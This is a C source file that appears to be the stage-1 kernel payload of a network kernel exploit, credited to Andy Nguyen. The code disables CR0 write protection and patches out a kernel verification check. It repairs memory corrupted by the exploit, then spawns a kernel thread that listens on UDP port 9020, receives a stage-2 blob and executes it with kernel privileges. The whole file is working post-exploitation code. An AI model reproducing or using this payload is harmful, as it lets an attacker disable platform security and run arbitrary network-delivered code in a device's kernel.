/*
 * Copyright (C) 2024 Andy Nguyen
 *
 * This software may be modified and distributed under the terms
 * of the MIT license.  See the LICENSE file for details.
 */

// clang-format off
#define _KERNEL
#include <stddef.h>
#include <string.h>
#include <sys/types.h>
#include <sys/_lock.h>
#include <sys/_rwlock.h>
#include <sys/_callout.h>
#include <sys/socket.h>
#include <machine/param.h>
#include <machine/segments.h>
#include <machine/specialreg.h>
#include <netinet/in.h>
#include "offsets.h"
// clang-format on

#define STAGE2_PORT 9020
#define STAGE2_SIZE 0x4000

#define IFS6_OUT_MSG 0x88
#define IFS6_OUT_NEIGHBORSOLICIT 0xe0

#define CC_CALLWHEEL 0x40

#define CALLOUT_CPU_SIZE 0x80

struct llentry {
  LIST_ENTRY(llentry) lle_next;
  struct rwlock lle_lock;
  struct lltable *lle_tbl;
};

LIST_HEAD(llentries, llentry);

static inline uint64_t rdmsr(u_int msr) {
  uint32_t low, high;
  asm volatile("rdmsr" : "=a"(low), "=d"(high) : "c"(msr));
  return (low | ((uint64_t)high << 32));
}

static inline void load_cr0(u_long data) {
  asm volatile("movq %0, %%cr0" ::"r"(data));
}

static inline u_long rcr0(void) {
  u_long data;
  asm volatile("movq %%cr0, %0" : "=r"(data));
  return data;
}

static inline void enable_intr(void) { asm volatile("sti"); }
static inline void disable_intr(void) { asm volatile("cli" ::: "memory"); }

static void stage2_proc(void *arg) {
  uint64_t kaslr_offset = (uint64_t)arg;

  void (*kproc_exit)(int) = (void *)kdlsym(kproc_exit);

  void **kernel_map = (void **)kdlsym(kernel_map);
  void *(*kmem_alloc)(void *, uint64_t) = (void *)kdlsym(kmem_alloc);

  int (*ksock_create)(void **so, int domain, int type, int protocol) =
      (void *)kdlsym(ksock_create);
  int (*ksock_close)(void *so) = (void *)kdlsym(ksock_close);
  int (*ksock_bind)(void *so, struct sockaddr *addr) =
      (void *)kdlsym(ksock_bind);
  int (*ksock_recv)(void *so, void *buf, size_t *len) =
      (void *)kdlsym(ksock_recv);

  void *so;
  ksock_create(&so, AF_INET, SOCK_DGRAM, 0);

  struct sockaddr_in sin = {};
  sin.sin_len = sizeof(sin);
  sin.sin_family = AF_INET;
  sin.sin_port = __builtin_bswap16(STAGE2_PORT);
  sin.sin_addr.s_addr = __builtin_bswap32(INADDR_ANY);
  ksock_bind(so, (struct sockaddr *)&sin);

  void *stage2 = kmem_alloc(*kernel_map, STAGE2_SIZE);
  size_t size = STAGE2_SIZE;
  ksock_recv(so, stage2, &size);

  ksock_close(so);

  void (*entry)(void) = (void *)stage2;
  entry();

  kproc_exit(0);
}

void stage1(void) {
  uint64_t kaslr_offset = rdmsr(MSR_LSTAR) - kdlsym_addr_Xfast_syscall;

  void (*setidt)(int idx, void *func, int typ, int dpl, int ist) =
      (void *)kdlsym(setidt);
  int (*kproc_create)(void (*)(void *), void *, void **, int flags, int pages,
                      const char *, ...) = (void *)kdlsym(kproc_create);

  // Disable write protection
  uint64_t cr0 = rcr0();
  load_cr0(cr0 & ~CR0_WP);

  // Enable UART
  *(uint8_t *)kdlsym(uart_patch) = 0;

  // Disable veri
  *(uint16_t *)kdlsym(veri_patch) = 0x9090;

  // Restore write protection
  load_cr0(cr0);

  // Restore UD handler
  setidt(IDT_UD, (void *)kdlsym(Xill), SDT_SYSIGT, SEL_KPL, 0);

  // Fix corruption done by nd6_ns_output
  uintptr_t pppoe_softc_list = (uintptr_t)kdlsym(pppoe_softc_list);
  (*(uint64_t *)(pppoe_softc_list + IFS6_OUT_MSG)) -= 2;
  (*(uint64_t *)(pppoe_softc_list + IFS6_OUT_NEIGHBORSOLICIT)) -= 2;

  // Fix corrupted in6_llentry object
  int callwheelsize = *(int *)kdlsym(callwheelsize);
  for (int i = 0; i < MAXCPU; i++) {
    uintptr_t cc = kdlsym(cc_cpu) + i * CALLOUT_CPU_SIZE;

    struct callout_tailq *cc_callwheel =
        *(struct callout_tailq **)(cc + CC_CALLWHEEL);
    if (!cc_callwheel) continue;

    for (int j = 0; j < callwheelsize; j++) {
      struct callout_tailq *sc = &cc_callwheel[j];
      struct callout *c;
      TAILQ_FOREACH(c, sc, c_links.tqe) {
        if (c->c_func == (void *)kdlsym(nd6_llinfo_timer)) {
          struct llentry *lle = (struct llentry *)c->c_arg;
          struct llentry *lle_next = (struct llentry *)lle->lle_next.le_next;
          struct llentry *lle_prev = (struct llentry *)lle->lle_next.le_prev;

          // Fix le_prev and lle_tbl
          if (lle_next && lle_next->lle_next.le_prev != (void *)lle) {
            lle_next->lle_next.le_prev = (void *)lle;
            lle_next->lle_tbl = lle->lle_tbl;
          }

          // Fix le_next and lle_tbl
          if (lle_prev && lle_prev->lle_next.le_next != (void *)lle) {
            lle_prev->lle_next.le_next = (void *)lle;
            lle_next->lle_tbl = lle->lle_tbl;
          }
        }
      }
    }
  }

  // Start stage2 process
  enable_intr();
  kproc_create(stage2_proc, (void *)kaslr_offset, NULL, 0, 0, "stage2");
  disable_intr();
}
